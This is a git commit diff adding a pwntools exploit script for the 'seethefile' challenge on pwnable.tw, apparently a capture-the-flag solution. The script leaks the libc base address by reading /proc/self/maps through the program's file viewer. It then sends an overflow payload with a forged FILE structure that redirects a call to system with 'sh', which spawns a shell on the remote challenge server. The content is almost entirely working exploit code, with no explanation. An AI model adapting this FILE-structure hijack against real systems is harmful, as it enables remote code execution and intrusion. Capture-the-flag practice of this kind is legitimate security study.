9fb37d6016d268fb4e4fdbb1549130a5b71452c9
Peter Klimenko <peterklimk@gmail.com>
2019-07-02 10:26:40 +0000

    seethefile solution

--- seethefile/base.py
+++ seethefile/base.py
@@ -1,29 +1,49 @@
 from pwn import *
+import re
 
 def p32(d):
     return d.to_bytes(4, "little")
 
 bin     = elf.ELF("./seethefile")
-#libc    = elf.ELF("./libc.so.6")
-libc    = elf.ELF("/lib32/libc.so.6")
-
-libc_base = 0xf7deb000 
-libc_sys = libc_base + libc.symbols[b"system"]
-libc_nullp = libc_base + libc.symbols[b"_null_auth"]
+libc    = elf.ELF("./libc_32.so.6")
+#libc    = elf.ELF("/lib/i386-linux-gnu/libc.so.6")
 
 #r = process("./seethefile")
-r = process(["gdbserver", "localhost:1234", "./seethefile"])
-#r=remote("chall.pwnable.tw", port=10200)
+#r = process(argv="gdbserver --no-disable-randomization localhost:1234 ./seethefile".split(" "))
+r=remote("chall.pwnable.tw", port=10200)
+
+def read(times):
+    result = b""
+    for _ in range(times):
+        r.recvuntil("choice :")
+        r.sendline("2")
+        r.recvuntil("choice :")
+        r.sendline("3")
+        data = r.recvuntil("---------------MENU")
+        result += data
+    return result
+
+r.recvuntil("choice :")
+r.sendline("1")
+r.recvuntil("see :")
+r.sendline("/proc/self/maps")
+procs = read(3).decode()
+libc_leak = re.search("(f[a-z0-9]*)-f", procs).group(1)
+print(libc_leak)
+libc_base = int(libc_leak, 16)
+libc_sys = libc_base + libc.symbols[b"system"] + 0x1000
+libc_nullp = libc_base + libc.symbols[b"_null_auth"]
 
 name = 0x0804B260
 after = 0x0804B284
-main = 0x08048A37
+jump_to = libc_sys
+print(hex(jump_to))
+print(p32(jump_to))
 
-vtable = 
+binsh = b"//bin/sh"
 
-file_struct = b"A" * 72 + p32(libc_nullp) + b"A" * (148 - 72 - 4) + 
-
-payload = b"A" * 32 + p32(after) + file_struct
+file_struct = b"B" * 10 + b"||sh||" + b"B"*(72-10-6) + p32(libc_nullp) + p32(name - 0x8) * 10
+payload = p32(jump_to) + b"A" * 28 + p32(after) + file_struct
 
 r.sendline("5")
 r.sendline(payload)
